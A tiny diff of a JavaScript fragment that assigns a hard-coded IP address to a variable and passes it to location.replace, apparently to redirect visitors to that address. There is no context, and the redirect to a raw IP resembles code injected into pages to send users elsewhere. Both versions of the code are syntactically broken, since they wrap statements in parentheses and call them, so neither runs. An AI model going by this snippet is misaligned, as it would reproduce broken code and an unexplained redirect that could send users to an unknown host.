@@ -1,2 +1,2 @@
-(var ip = "145.14.21.172";
-location.replace (ip);)();
+var ip = "145.14.21.172";
+(location.replace (ip);)();
